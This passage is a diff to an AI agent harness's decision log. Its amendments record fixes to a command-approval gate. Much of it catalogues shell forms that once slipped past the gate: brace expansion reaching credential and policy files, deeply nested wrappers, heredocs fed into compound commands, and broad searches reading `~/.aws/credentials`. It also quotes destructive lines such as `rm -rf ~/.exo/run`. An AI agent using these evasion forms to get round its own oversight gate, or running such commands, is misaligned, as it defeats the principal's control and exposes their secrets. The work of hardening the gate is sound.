@@ -159,6 +159,16 @@ ruling carries Status, Why, Proposal, Rejected and Open instead, and takes Decis
   a rewrite with no lifting (throws away Hermes's edge-case fixes and A's 2026 work).
 - **Revisit if:** the lean core misses its wave 1 exit test by more than two waves of effort, or Hermes
   splits out a small, dependency-free core library that Exo could depend on without inheriting the rest.
+- **Amendment 2026-10-21 (#264, W1-6):** exod's HTTP transport answers a bad number in a request with 400 and a
+  JSON `{"error": ...}` body. `Content-Length`, the `since` query value and `Last-Event-ID` must be ASCII digits
+  up to 2^63 - 1, SQLite's largest integer and so the durable event log's bound. Leading zeros are allowed. A
+  bare `int()` read them and the client handler swallowed its `ValueError`, so a word or a float in any of them
+  got no reply, and so did a negative length, which reached `readexactly`. A negative `since` replayed from the
+  start. A `since` past the bound sent the stream's 200 header, then failed in the replay and left its
+  subscription in the hub. A length over 8 MB is still 413 up to the bound, and a 400 past it. The
+  `events.subscribe` command keeps its typed `internal` reply for such a `since`: `GET /events` has no reply
+  envelope, so the bound is checked before the stream opens. A malformed request line still closes the
+  connection with no reply.
 
 ## D-011 (2026-10-12) Store v2: hafiz format absorbs Arif and Eldunari
 - **Decision:** adopt `docs/STORE-V2.md`. One format, three kinds of store: person (hafiz), agent (Eldunari
@@ -173,6 +183,13 @@ ruling carries Status, Why, Proposal, Rejected and Open instead, and takes Decis
   local only until A rules on a private remote.
 - **Rejected:** keeping Arif in Postgres (cannot travel to a device); three separate stores per person
   (drift); remote embeddings (personal text leaves the machine).
+- **Amendment 2026-10-21 (#254):** until the FTS5 and embedding stages are built, retrieval is the in-memory BM25 of
+  `store.find`. It rebuilt its tables from every node on each call. It now keeps them with the node set they were
+  built from and builds them again when a reload makes a new set (a refresh that sees a change reloads). Holding the
+  set itself is the reload generation: a separate counter, read apart from the set, could pair an old set with a new
+  number when two threads share a store. Rejected: building the tables in `reload()`, which would tokenize stores that
+  are never searched. Also rejected: moving to FTS5 now, which is stage 3 of `docs/STORE-V2.md` and a larger change.
+  Scores and order are unchanged. Docs: `docs/CORE.md` "Find".
 
 ## D-012 (2026-10-12) One learning loop: review, taste and hill-climbing eval
 - **Decision:** adopt `research/LEARNING-LOOP.md` as `exo.learn`. One background reviewer that only
@@ -184,6 +201,16 @@ ruling carries Status, Why, Proposal, Rejected and Open instead, and takes Decis
   file (Command Code pattern, `research/UI.md`).
 - **Calls made by the lead:** unguarded taste auto-promotes after evidence from two separate sessions,
   shown in the brief and reversible; taste syncs between A's machines only through the signed store.
+  *Amendment 2026-10-18 (PR #219):* evidence that is all imported history (`exo ingest` rows) does not
+  auto-promote under rule 4. The principal reviews that first batch, as `docs/ARCHITECTURE.md` section 5 says.
+  Imported evidence is dated by its source time, and superseded rows (an edited ChatGPT prompt's older
+  versions, inactive Hermes rows) do not count for the rule of three.
+  *Amendment 2026-10-21 (issue #263):* the chat capture after each turn no longer reads the whole ledger to find the
+  capture keys already written. The learner keeps them, with the last row it read, and reads only the rows after it.
+  The result is the same as a full read of any ledger `exo log verify` passes: the ledger is append-only and nothing
+  takes a key back. A ledger that no longer holds that row in its place is read again from the first row. With 10,000
+  captured rows in the ledger, each turn's capture took about 70 ms. Now the first turn after a start takes that once,
+  and each later turn under 1 ms.
 - **Waiting on A (spend and model choice):** monthly ceiling for the nightly eval and climb; the judge
   model.
 - **Rejected:** Hermes-style direct edits by the reviewer (no check that a lesson helps); Command Code
@@ -405,6 +432,11 @@ ruling carries Status, Why, Proposal, Rejected and Open instead, and takes Decis
   Policy is the receiving seat's: auto for the same principal, hold otherwise, deny for a bad signature; held
   messages wait 30 minutes for an approval card. A peer message is input, never consent: attempts to approve
   are refused and shown to the principal.
+  *Amendment 2026-10-18 (PR #212):* a held message whose sender named no session, while no session is live, has an
+  approval with no thread. Both clients show that card in every thread. Allow used to close it as denied ("no
+  session here can take a message"), although the card says allow delivers it. Allow now opens a new thread of the
+  seat, titled after the sender, and delivers the message there. If that thread cannot open, the message closes as
+  not delivered and the principal gets a notice. Deny and expiry open no thread.
 - **Protocol:** one command `peers` with actions list, send, deliver and receipt (the brief said
   `peers.list` and `peers.send`, but a second command would break the cap; this uses the last slot, 30 of 30, so
   the test now allows 30). Events `peer.message` and `peer.delivery` (26 of 30).
@@ -428,6 +460,13 @@ ruling carries Status, Why, Proposal, Rejected and Open instead, and takes Decis
   Subagents keep their own logs (`memory_zoom(subagent=...)`); their report reaches the parent as the delegate
   result. exo-memory reads the core log instead of writing its own. Existing sessions were imported once, in time
   order, with `origin=import`; nothing deleted.
+  *Amendment 2026-10-18 (several seats in one home):* seats whose files sit in one `$EXO_HOME` are separate agents.
+  Each runs its own core with its own writer lock, and all of them share `sessions.sqlite` and `schedule.sqlite`.
+  The database numbers each event past the table's highest, so two cores never reuse a `seq`. `hello` reports that
+  highest number, so a joining client skips the other seat's past events. Only an agent's writer fails that agent's
+  leftover delegate tasks. A scheduled job with a `seat` runs only in that seat's core. A job with no seat runs once
+  per slot, in the seat whose timer claims the slot first. `add` refuses a seat that no core could run
+  (docs/SEATS.md "Several seats in one home", docs/SCHEDULE.md).
 - **Protocol:** still 30 commands: `session.create` takes `kind`, `SessionInfo` carries `agent` and `kind`. One
   event, `memory.summarized` (27 of 30): tree upkeep was showing as `context.compacted`, which read as context
   compaction in the trace and TUI.
@@ -447,6 +486,33 @@ ruling carries Status, Why, Proposal, Rejected and Open instead, and takes Decis
   (77% against 79% with recall).
 - **Not done:** a live 20-turn cache measurement on the fixed code; importing exo-memory's old episodic log (it
   holds copies of the same sessions); summaries for imports are slow on glm-5.3-flash (about 75 s per leaf).
+  *Amendment 2026-10-18 (PR #213):* the system message now names the thread's working folder, after the memory
+  block and before the tree. The claude CLI runs in a private folder and names that folder in its own environment
+  note, so the agent said it worked there. The new line names the session's stored cwd and overrides any folder a
+  note names. Subagents get the same line in place of their own "Working directory" line. The line is fixed per
+  thread, so each thread's prefix still caches. The cost: the byte-stable prefix is now shared only by threads in
+  the same folder. Anthropic routes put one cache breakpoint at the end of the system message, so an agent with
+  threads in two folders caches its tree once per folder.
+  *Amendment 2026-10-18 (PR #216):* a private thread wrote to the ledger and lost its own start. Now nothing in or
+  under a private thread is remembered: `SessionStore.private` walks up the parents, the loop skips the memory
+  writes, memory tools get `agent_context="private"`, and learning, findings, panel responses and the context
+  plugin record nothing from it. Its entries still stay out of the agent tree, so it keeps a summary tree of its
+  own (key: its session id). Its tail starts at that tree's last summary, and its turn waits for that tree as D-068
+  says. Its delegate children open with `memory_zoom(subagent=)` only from it or a fork of it. A fork's copies count
+  at their original's log position, so a fork opens with its parent's tail. Details in docs/MEMORY-MODEL.md
+  "Private threads".
+  *Amendment 2026-10-21 (#245, PR #405):* a copy counts at its original's log position only while the tree holds
+  that original. When the parent undid an entry after the fork, the tree dropped the original, and no tree held
+  the copy. Once the fork's own later entries were summarized, its tail started after the copy, so its calls lost
+  it. Now a fork that is not private keeps such copies in its tail, verbatim, in order, ahead of its own entries
+  (`SessionStore.orphaned_copies`). Only copies of logged entries are kept. A copied context note was never logged,
+  so it still leaves the tail as the tail moves on. This is the second option in #245. The first, a summary tree
+  per fork as a private thread has, was not taken: every public fork would run a second tree, with its own
+  summarizer calls and a turn that waits on it (D-068), for copies that exist only after an undo in the parent.
+  The cost of the second option: the kept copies sit outside `tail_messages` and `/compact`, so a fork whose
+  parent undid 20 turns carries all 20 in every call. In a fork of a fork the kept copies come after the middle
+  fork's own entries, which the tree holds. The lookup runs only on a fork (`fork_seq` set) and reads only its
+  copies, so a thread that is not a fork pays nothing.
 
 ## D-029 (2026-10-12) jevgrep as code_find; native port later if the measured win holds
 - **Why:** "where is X decided" questions cost an agent many grep and read rounds. dzhng/jevgrep (MIT, `jg`
@@ -530,6 +596,22 @@ ruling carries Status, Why, Proposal, Rejected and Open instead, and takes Decis
   is attached). Limits: 4 concurrent per agent, 2 h wall, 5 MB output. Jobs end with exod; after a crash the next
   start reports them `lost` (the process is not touched: a pid can be reused). The gate classifies the command exactly
   as foreground bash (a test compares classifications and decisions).
+  *Amendment 2026-10-20 (PR #346, a follow-up to PR #321):* a thread of its own builds each completion notice. Since
+  #321 the notice reads and redacts the job's whole log, and on the event loop that took hundreds of milliseconds for
+  a 5 MB log. The thread belongs to the job manager, not to the loop's default pool, so a busy tool thread never holds
+  a notice up. Notices are built one at a time and handed on in the order the jobs ended. Shutting down waits for a
+  notice still being built and, when no turn runs, keeps it for the next turn. A shutdown that runs to its end waits for
+  the last build and then stops the thread, so no worker outlives the engine. A hard stop that cancels that wait loses
+  the notice being built, but the job's end still goes out as a `job.updated` event. `close()` then shuts the thread
+  down without waiting, so it takes no more work. That build runs on to its end, and the process waits for it as it
+  exits. The notices of jobs lost in a restart are built the same way, in tasks the core's start does not wait for, so
+  two first commands at once still start the runtime once. A turn still running when such a notice is built takes it at
+  its next tool round, as it takes a completion notice. Before, a lost job's notice was queued before any turn could
+  start. A lost job's notice that fails is reported as a `harness.error` event, as a completion notice that fails is. So
+  is a notice that fails while exod shuts down: `close()` keeps the engine's trace sink until its steps end and drops it
+  just before the session store closes. Before, it dropped the sink first. Rejected: the loop's default pool
+  (`asyncio.to_thread`), where busy tool threads held the notice up and `close()` with it. `docs/JOBS.md` "The
+  completion notice".
 - **Item 4, principal capture as a mechanism (docs/MEMORY-MODEL.md).** (a) The summary template has a verbatim
   `Principal Directives` section, and a harness check restores any ruling or correction the model dropped; (b) before
   a leaf with principal messages is summarized, the span is offered to the memory provider's `capture_principal`
@@ -633,8 +715,42 @@ ruling carries Status, Why, Proposal, Rejected and Open instead, and takes Decis
   grants are the principal's alone; list and revoke as a `command.run` command.
 - **Not done:** escalation along an org graph (P1-2); the TUI and web clients do not yet show `approvers`, echo
   `binding`, or sign as a seat (left for the UI work); no client helper beyond `sign_approval` for a seat to answer.
+- **Amendment 2026-10-19 (issue #208):** the posting step, the scrub and the binding saw only text on the line, and
+  a body from stdin, `@file`, `--input`, command output or a variable passed as empty. Such a post was allowed
+  under an internal scope, and an "always" bound to the line covered any later body. Now `_classify_gh` and
+  `_classify_http` mark it `unseen_body` (stdin not spelled out on the line, `@` fields, `--input`, `--fill`,
+  templates, the editor, generated notes, gist files, curl/wget/httpie file and stdin bodies, any expanded word
+  except a header or login value), and text options are read as gh reads them (the last of a repeated option, short
+  clusters). `gate.body_unseen` also counts a body file nobody read. Under the posting rules such a post asks with
+  a violation that names the cause; in every category it gets `once` (no "always") and no grant matches it; a
+  required executor refuses it as a recorded `deny`. The exo-gate hook reads a body file only by an absolute path:
+  it does not know the command's folder (`cd docs && gh ... --body-file notes.md`). An unrelated heredoc on the
+  line no longer fills in a body file's text, and curl's `-d@f` and gh api's `-fbody=x` are posts. Stdin is read only
+  where bash and the writer change nothing: a literal heredoc (no `$`, backtick or backslash unless the delimiter is
+  quoted), a plain here-string, or a pipe from one simple command (`cat` with such a heredoc, `echo` with no option or
+  backslash, `printf` with one plain format); a subshell or group before the pipe, `printf` formats and `echo -e` are
+  unseen. gh text options are read with gh's own table of options that take a value (`-t -b -b x`), `--attach` is
+  unseen, and curl's `--data-ascii`, `-K` and a host it cannot read (`-d x "$URL"`) are posts, not reads or local
+  writes. After a second review: a word bash may expand without `$` (brace expansion, a glob, a leading `~`) counts
+  as an expansion; only a heredoc or here-string on descriptor 0 is stdin (heredocs keep their fd number, on the
+  `_Word.fd` lexer change #305 also makes); a heredoc ended by a near match of its delimiter (`EOF `, ` EOF`, CR, a
+  tab under plain `<<`) is `ambiguous`, so its body is unseen; the long text options take a value in the gh table;
+  and the hook never reads a body file under `/dev` or `/proc`. Rejected:
+  resolving a relative path against the tool's `cwd` (the hook receives no cwd, and a `cd` on the line moves it);
+  reading the stdin source file in the gate (the same folder problem, and a host read before a required worker).
+  Limits: `docs/GATE.md` "What an approval covers".
+
+- **Amendment (2026-10-21, #397):** a merge commit's subject and body are posted text.
+  `gh pr merge --subject`/`--body` become the commit message in the repository, public on a public
+  repository, so the posting rules and the scrub see them when a merge carries them, as they have
+  seen a close's comment since #326. A merge carrying neither is unchanged. A reopen's comment is
+  posted text the same way: gh posts it on the thread.
 
 ## D-034 (2026-10-12) Providers setup: one engine, three surfaces, keys write-only
+- **Amendment 2026-10-19 (#271):** provider status rows replace URL userinfo with `***@`, including the rows
+  printed by `exo models` and sent to `/providers` and the web. Invalid URLs produce a generic label without
+  repeating the input. Actual connections and probes keep the configured endpoint. Paths, queries and fragments
+  are not secret-scrubbed by this display helper. No command, key, setting or setup step changes.
 - **Why:** a new user had no clean way to add a model key. Keys went in by hand (env, `security`, or a 0600
   file), `exo models` only reported, and the web client had no provider settings at all.
 - **Engine:** `exo/providers_setup.py`. `rows` gives every catalog provider with status (key found and where,
@@ -691,6 +807,33 @@ ruling carries Status, Why, Proposal, Rejected and Open instead, and takes Decis
   the user's shell); a top-level `--seat` or `--resume` on the main parser (clashes with subcommand flags).
 - **Not done:** Windows; a published package on PyPI (the git URL is the source until then); an
   `exo uninstall`.
+  *Amendment 2026-10-18 (PR #213):* the installer also installs the skill pack into `$EXO_HOME/skills`, where the
+  core's skill index and exo-orchestra read it. Each pack skill is its own folder with a `.exo-managed` marker, as
+  plugins are, and the marker names the folder. A re-run, and so `exo update`, replaces or removes a folder only
+  when its marker names it. `cp -r` copies the hidden marker, so a copy of a pack skill under a new name, or a
+  renamed one, carries a marker for another name. That folder is the user's and is kept with a warning. A folder
+  without a marker that differs from the pack's skill is left alone, and an exact copy is adopted. A link is never
+  adopted, replaced or removed. Rejected: one marked `$EXO_HOME/skills` folder, because a refresh would delete the
+  skills users add there. Rejected: removing every marked folder the pack lacks, because that deleted copies made to
+  change a skill. Rejected: shipping the pack as package data, because exo-orchestra and the documented search
+  order read `$EXO_HOME/skills`.
+  *Amendment 2026-10-19 (#268):* plugins follow the same rule. A `--plugins` list removes a marked plugin folder it
+  leaves out only when the marker names that folder, so a `cp -r` copy of a plugin is kept with a warning. A marker
+  with no name line comes from an install before markers named their folder. Exo cannot tell that folder from a
+  copy, so it is kept too, and a warning names it. A selected plugin with such a marker is refreshed and its marker
+  gains the name. Rejected: treating a marker with no name as Exo's, because that deletes copies made before this
+  change. Rejected: comparing the folder with the checkout's plugin, because an older install of a plugin that has
+  changed since differs from it as much as an edited copy does.
+  *Amendment 2026-10-21 (#260):* the subcommand parser imports a command's module only when that command runs.
+  `src/exo/cli.py` lists each command that lives in another module in a `LAZY` table, with its module, handler and
+  help line. `build_parser(cmd)` builds the full parser for `cmd` alone. Every other command keeps its name and
+  help line, so usage, errors and `exo --help` are byte-identical to the full parser, and a test compares the two
+  for every command. `exo --help`, `exo --version` and bare `exo` import no command module, and a module that fails
+  to import breaks only its own commands. The update self-check now builds the full parser, so it still imports
+  every command's module. Rejected: building the full parser for `exo --help`, because help would still pay for
+  every import. Rejected: a checked-in snapshot of the help text, because every help change would have to edit it
+  too. The cost is that each help line is written twice, in the module and in the table, and the test fails when
+  they differ.
 
 ## D-036 (2026-10-12) `exo` and `exo web` in any order share one core
 - **Why:** a live bug. `exo web` connected to `run/exod.sock`, found no `exo serve`, and the chat page showed
@@ -712,6 +855,13 @@ ruling carries Status, Why, Proposal, Rejected and Open instead, and takes Decis
   tools and approvals stay tied to its window). Web with `--socket`/`--url` never starts anything. Page errors are
   sentences (`core_message`), not exception text. No protocol change.
 - **Not done:** `--in-process` flag (the client already falls back in process); Windows.
+- **Later (#145, #148):** the core is started through a `python -P` helper that calls `setsid`, forks and exits, so
+  the core is reparented to init (or the nearest subreaper) and is not a child of the client, unless the client
+  is itself PID 1 or a subreaper. This is hardening: `principal.stamp` refuses
+  a peer that descends from the core, and the client that starts the core is its parent, so the old ancestry could
+  not refuse that client. The handshake is bounded, reads the pid from the helper's last output line, and a core
+  that dies while starting is reported at once (`waitpid` when this process adopted it, else a zombie or missing
+  pid), with no made-up exit code. A client that adopted its cores reaps any that exited later at its next start.
 
 ## D-037 (2026-10-12) Completion and guidance in the composer
 - **Why:** the principal asked for command autofill, suggestion and guidance, "a better version of what Hermes CLI
@@ -737,6 +887,16 @@ ruling carries Status, Why, Proposal, Rejected and Open instead, and takes Decis
   Under reduced motion there is no timer: it only updates on events.
 - **Typo help:** an unknown `/comand` is not sent. The note says "did you mean /compact?" and the corrected line waits
   in the composer. With nothing close, the line goes to the core as before. The web does the same for its commands.
+  *Amendment 2026-10-18 (issue #146):* on the web the names are the page's own commands, the core's `commands.list`
+  and the terminal client's own (its `COMMANDS` table: core plugin names such as `/grants` count only when
+  `commands.list` has them, as in the TUI), and "near" is the TUI's rule (a port of `complete.closest`, for
+  lower-case names only). A `/name` from those the page does not run (`/grants`, `/help`), or a near typo of one,
+  stays in the box with a note rather than becoming a message; a line close to no name (`/tmp is full`, `/data is
+  corrupted`, `/Users is big`) is a message. Until the page has the core's names it holds every `/name` line that is
+  not its own or the terminal client's, and asks again with no limit (1 s doubling to every 30 s, and on each send,
+  which does not move the backoff on). The asking ends once the core has given its names (an older core that
+  answers `unknown_command` or `unsupported` for `commands.list` counts, with no core names) and its
+  `guidance.enabled` (an unset key, answered `not_found`, is on).
 - **Rejected:** a model call to suggest commands (cost, latency, and the rules are enough); a second ranking in each
   client (they would drift); storing history in the browser (the web client keeps none across page loads, on purpose).
 - **Not done:** file completion for bare paths (`./x`, `~/x`) outside `@`; `/findings <id>` (the core takes only
@@ -755,10 +915,66 @@ ruling carries Status, Why, Proposal, Rejected and Open instead, and takes Decis
   stricter; the `indirection` signal makes `decide` ask even if the inner part only logs. An "always" on opaque code
   covers that exact command only. The principal can lower `opaque_exec` only by naming it in a category line or rule.
   The old program and prefix cases are gone; one classifier serves the core and the `exo-gate` plugin.
+  *Amendment 2026-10-17 (issue #178):* naming `opaque_exec` at any level turned the indirection floor off, so
+  `categories: {opaque_exec: deny}` let `bash -c 'git push origin main'` fall back to the push's own `log`. Only a
+  name that lowers it (a category line, or the first matching rule on `opaque_exec`, at `log` or `allow`) turns the
+  floor off now. Naming it at `ask` or `deny` keeps the floor, so a command read inside a wrapper asks at least.
+  *Amendment 2026-10-17 (issue #184):* a path word is matched against the secret stores after bash brace
+  expansion, scanned as bash scans it: a shell word from its source text, so only unquoted braces expand. The word
+  and every word its comma groups and `{x..y}` sequences make are checked, and a hit on any counts; past 1,024
+  words or 32 levels of nesting, or past 4,096 expanded words in one tool call, the word counts as a store path
+  (fails closed, no grant). `cat ~/.config/gh/{hosts,x}.yml` was an allowed read.
 - **Decision, store:** `policies/`, `state/`, `ledger.sqlite*`, `keys/`, seat files and the sockets under `$EXO_HOME`
   or the principal store are on a protected list. Any write is `store_write`: a floor like credentials, no standing
   grant, principal-only (`approvals.yaml` cannot add seats), enforced in observe mode. Reads stay `read`; `keys/`
   reads stay `credentials`.
+  *Amendment 2026-10-18 (issue #224):* a write target is matched against the protected list after bash brace
+  expansion, read as for the secret stores (#184): a shell word from its source text, a file tool's path as
+  written. A hit on any expanded word counts, and a word past the brace limits counts as the store. The store
+  checks have their own 4,096-word budget per tool call. `echo x > ~/.exo/polic{i..i}es/default.yaml` was an
+  allowed local write.
+  *Amendment 2026-10-18 (issue #241):* the store-read guarantee covers the search tools. The gate checks only the
+  `path` a `grep` or `glob` call names, and the tools walked everything below it, so `grep {pattern: "key", path:
+  HOME}` returned `~/.aws/credentials`, `$EXO_HOME/keys/*` and the principal credential as an allowed read. The tools
+  now leave out every folder and file below the root that `is_sensitive_path` matches, as found and as resolved (a
+  link into `~/.ssh` by any name), do not enter a store folder, and end with `[skipped N secret-store paths; read one
+  by name to be asked]`. A store the call names is read after the gate asks; a link out of it into another store is
+  still left out. `~/.ssh/..` only looks like a store: it walks the home folder with the stores left out. A
+  store-named link to an ordinary folder (`x.key` to the home folder) returns nothing, since every path below it still
+  looks like a store (fail closed). A root whose real path is `/` is refused (the walk takes minutes). In a repo's own
+  `.claude` folder (beside a `.git`, not `~/.claude` or `CLAUDE_CONFIG_DIR`, holding no Claude login, transcripts or
+  shell snapshots) only `worktrees`, `commands`, `agents` and `skills` are searched, so a `.claude/worktrees` checkout
+  is searchable and another home's config folder is not. `code_find`, whose `jg` walks the folder itself, refuses a
+  folder that is or holds a known store. Chosen over a gate-side ask for every broad search because a search of a
+  project or the home folder stays an allowed read and only the stores drop out; the count keeps the result honest.
+  *Amendment 2026-10-18 (issue #169):* the run folder is a secret store (D-039 limits, `docs/GATE.md` "Who
+  answered"), and a secret wins over the store rule, as for `keys/`. So a write, delete, move or replacement that
+  touches the folder itself or a credential file in it is `credentials`, not `store_write`: `rm -rf ~/.exo/run`,
+  `rm ~/.exo/run/*`, and moving or replacing the folder that holds the core sockets (`mv ~/.exo/run x`,
+  `ln -sfn /tmp/x ~/.exo/run`, `cp -rT /tmp/x ~/.exo/run`, `mkdir -p ~/.exo/run`, `chmod 777 ~/.exo/run`). It
+  still always asks and is never granted, but it is no longer principal-only: a seat that `approvals.yaml`
+  delegates `credentials` to, or lists in `default:` with no `credentials:` line, may answer it, and
+  `deny: [store_write]` no longer matches it. Job output in `run/jobs/` and a socket or pid file named alone stay
+  `store_write`. Chosen because one class per call keeps the read and write rules of a secret store the same;
+  keeping the store part principal-only through `_combine` is a follow-up.
+  *Amendment 2026-10-19 (issues #210, #269, #217):* three gaps in what the gate guards of its own inputs. The bus
+  folder `$EXO_HOME/bus` joins the protected list, with `bus/registry.json` and `bus/relay.sqlite*` as distinctive
+  names, and so do the files `EXO_BUS_REGISTRY` and `EXO_BUS_DB` and the folder `EXO_BUS_KEYS_DIR` point to (and their
+  legacy `DIVAN_` names, both when both are set), because the registry is where signed seat answers find their keys.
+  On a line that reaches a folder in `$EXO_HOME`, a relative name is checked as the path it names, resolved as the
+  kernel resolves it from each such folder, so `..` from `run/jobs` reaches the run folder's secrets; `run` stays out
+  of the store-folder list, since that would make job output a secret. A write through a descriptor or
+  process-folder path (`/dev/fd/N`, `/dev/stdin`, `/proc/<pid>/{fd,cwd,root,map_files}`) is `store_write`, other
+  than the writer's own stdout and stderr, and so is a store path opened for reading on a numbered descriptor; the
+  lexer keeps a redirection's fd number for that; on stdout and stderr any target the gate cannot pin to a path (a
+  variable, a glob, a relative name) counts. The `$EXO_HOME` resolution charges each join, as it is made, the path
+  parts it builds, to one budget per tool call (65,536 parts) shared by every `$( )`, and asks once it is spent or
+  past 64 store folders, so it stays linear in the line. Chosen over resolving those paths, which the gate can
+  only do in its own process, and over making every write to `/dev/fd/1` ask. Left out: trusting the bus registry
+  for seat keys only when `EXO_BUS_LEADER_PUBKEY` is set (#210's defence in depth), which changes who can answer.
+  Not done: a write back through a link to a descriptor path, `/dev` or `/proc/self` made out of the gate's sight,
+  after an open on descriptor 3 or above the gate cannot read; a hardlink to a store file opened on stdout; and a
+  walk over a folder above the run folder.
 - **Decision, policy reload:** pin the policy at first load. A changed file is loaded and logged (`policy_change`
   row with file hashes) and each call is decided under both; the stricter wins. Loosening takes effect only after
   `/gate accept` or a restart. Chosen because it is simple and sound: a tool cannot loosen policy by any write path,
@@ -766,13 +982,378 @@ ruling carries Status, Why, Proposal, Rejected and Open instead, and takes Decis
   policy edit (new protocol surface, and the principal's own editor edits would trip it); trusting mtime plus a trace
   event (a tool write that the gate missed would still take effect); detecting "made by a non-tool path" (background
   jobs run beside the turn, so the gate cannot tell who wrote a file).
+  *Amendment 2026-10-19 (issue #211):* "the stricter of old and new" covered only the outcome. The approvers sent
+  with an ask and the length of a new grant read the pinned `approvals.yaml`, so a seat the principal had just
+  removed could still answer and an "always" outlived `days: 0`. Now an ask lists `gate.strictest_approvers`, the
+  approvers both tables allow in the pinned order (the principal is first in both, so it is never empty), and a
+  grant lasts the shorter of the pinned and changed `always` values. A wider table still waits for `/gate accept`;
+  a table that does not load counts as the defaults. Limits: an ask already open keeps its approvers, and grants
+  written before the change still match until they expire or are revoked.
 - **Cost:** about 70 everyday commands are pinned as `allow` in `plugins/exo-gate/tests/test_default_ask.py`
   (`pytest`, `uv run pytest`, `git status`, `ls`, `rg`, `npm install`, `cargo test`...). New asks a user will see:
   `make`, `npm run`/`npm test`, scripts, `python -c`, unknown programs such as `kill` or `open`, and any write to the
   store. Each opaque ask is bound to the exact command.
-- **Not done:** the known limit stays. A trusted program that runs project code (pytest and conftest.py, git hooks,
-  package install scripts) can run code the agent wrote earlier. A sandbox is the fix. `/gate accept` goes through
-  `command.run`; binding who may call it to the connection is the server identity work (audit priority 3).
+- *Amendment 2026-10-18 (issue #137):* `_DEPTH = 4` bounds recursive shell inspection, for a `bash -c`, `sh -c` or
+  `eval` chain called from the bash tool. A GitHub comment inside four nested wrappers remains `github_post`; at five
+  it becomes `opaque_exec` and asks by default. A command inside a code string (`python -c`, `execute_code`) gets one
+  more level wherever the code sits (`classify_code` starts again at `_DEPTH - 1`), so a chain that mixes wrappers and
+  code strings can be read deeper than four; nested `$( )` is flattened and not capped, while nested backticks are
+  (five levels are `opaque_exec`, "nested too deep to read"). Past the cap the line asks; an ssh/mosh chain past it
+  asks too, with the first host as target (#153, fixed by #164). The card at the cap names the outermost
+  wrapper (`bash runs shell commands`), the same card as `bash -c 'foo'`. Why not name the cap (#137's second remedy):
+  `_combine` keeps the first of equally severe parts, so the `nested too deep to read` part that `xargs`,
+  `find -exec`, `uv run` and `$( )` add at the cap reaches the card only when the outer part is benign; adding the
+  same part at the `bash -c` cap would change nothing the principal sees. Showing the cap means letting an inner
+  summary win ties in `_combine`, a classifier change for its own PR, so that remedy stays open. A category deny under
+  `categories:` then fired only when the denied category was the line's most severe part: on a compound line a more severe
+  part took over and the line asked, and approving it ran the denied action
+  (`gh pr comment 3 --body hi && rm -rf build` is `delete`; lifted by the D-075 amendment for #191, 2026-10-19). An entry in the `deny:` list has matched every part
+  the gate reads since D-075, so it denies that line; a `coproc` or `function NAME {` block whose inner command ranks
+  at or below `opaque_exec` split the same way (denied under `deny: [web_read]`; asked under
+  `categories: {web_read: deny}`, lifted by the D-075 amendment for #191, 2026-10-19, to deny as well). The known unread forms below are allowed outright on main, not asked, and no entry
+  for the hidden action's category reaches them: `${...}` bodies (#143, open PR #158). Two forms left this list on
+  2026-10-19: text piped or fed by heredoc to `ssh` with no remote command (#240), read since #303, and `git clone -c`
+  with a command-running key, read as `git -c` is since #231. A `command:`
+  regex reaches them on the raw text only: the literal-word view (#136) is built from text the gate reads, so quoting
+  still evades the regex inside these forms, while it no longer does inside an array subscript (read since #189), a
+  value given to `declare` (read since #194, for #188), a command-valued option (read since #164 and #288) or a git
+  config value (read since #231). The
+  other deny-to-ask paths (`eval $(...)`, stdin-fed `xargs -I{} sh -c '{}'`, the body of `time { ...; }`, and the
+  wrapper forms #160 left unread, such as `su -c`, `bwrap` and tmux `if-shell`) are listed in `docs/GATE.md` "Known
+  limits".
+  Rejected: raising `_DEPTH` (each level re-lexes the inner text, and five hand-nested wrappers are not a workflow,
+  only a probe); naming the hidden command on the card (the gate did not read it). This records the limit of the
+  existing decision; the pinning test is `test_shell_inspection_depth_limit`.
+- **Not done:** the project-code limit stays. A trusted program that runs project code (pytest and conftest.py, git
+  hooks, package install scripts) can run code the agent wrote earlier. A sandbox is the fix. `/gate accept` goes
+  through `command.run`; binding who may call it to the connection is the server identity work (audit priority 3).
+  *Amendment 2026-10-17 (issue #161):* the lexer attached a heredoc to the command whose line held the `<<`, which
+  for `{ bash; } <<EOF`, `( bash ) <<EOF` and `while ...; do bash; done <<EOF` is the closing token, so the shell
+  inside ran a body the gate never read (ask, where `bash <<EOF` with the same body is denied by a category deny).
+  Now a heredoc or here-string after a closing `}`, `)`, `done`, `fi` or `esac`, and readable text piped into a
+  compound, is fed to the commands inside it, nested ones included, except a command whose stdin is already set: its
+  own heredoc, here-string or `<` redirection, a pipe from a command inside, an earlier `exec < file` inside
+  (however spelled or prefixed, or possibly run by eval, source, `.`, a variable program or a function on the line),
+  or a nested compound's own closer redirection or pipe (inner closers win, as in bash). Nothing is fed when the
+  closer has its own `<`, and a closer heredoc wins over a pipe in. Feeding such a command would read decoy text as
+  what the shell runs (`{ curl ... | bash; } <<< 'rm -rf build'` would leave `opaque_exec` for `delete`). Chosen
+  over feeding only the last command: any inner command may read stdin. Only shells, interpreters and gh act on it, so
+  `{ cat; } <<EOF` stays `read`, but the fed text can change the line's category and the summary shown at ask. Each
+  text is classified once per line (the stdin of a `sqlite3`, `psql` or `mysql` client too, #154), every command it
+  reaches still gets what that reading found (its own store check needs a delete there: skipping the repeat let a
+  later `psql <store folder>` pass as a `delete`), a shared stdin is listed once, the parser finds command position
+  and a closer's opener without rescanning, and the scan for function names on the line starts only where a word does,
+  so the cost stays linear (a group of shells fed a body that is itself a group of fed shells was read width to the
+  power of depth times, n here-strings fed to n shells cost n squared, and so did n openers in a row; a body after
+  `<<$'EOF'`, which is also read as commands, was read once per command it reached, so nested groups of plain commands
+  took a minute for 462 bytes, and groups of `psql` fed `\!` lines took 210 s for 604 bytes nested four deep; looking
+  for `name()` from every character of an unbroken word took 26 s for one of 50,000 characters).
+  For fed shells and interpreters, a line that was `opaque_exec` takes the inner category
+  and carries the issue #178 floor. Only naming `opaque_exec` at `log` or `allow` turns that floor off.
+  A `deny: [opaque_exec]` entry still denies these shell and interpreter lines (D-075). Under
+  `categories: {opaque_exec: deny}` or an ordinary rule they then asked where they were denied, as
+  `bash <<EOF` already did (lifted by the D-075 amendment for #191, 2026-10-19). Fed SQL clients follow their plain-input classification,
+  without that floor. A compound feeding `\! git push origin main` to `psql` can change from ask
+  to the push's `log`. D-075 `deny` and `reserved` entries still match every retained part.
+  A category line or rule that denies a part denies the line (#191); other category lines and rules use the combined classification. `coproc W { ...; }
+  <<EOF` and `function NAME { ...; } <<EOF` are fed the same way, as #181 reads their bodies; the body of `time { ...;
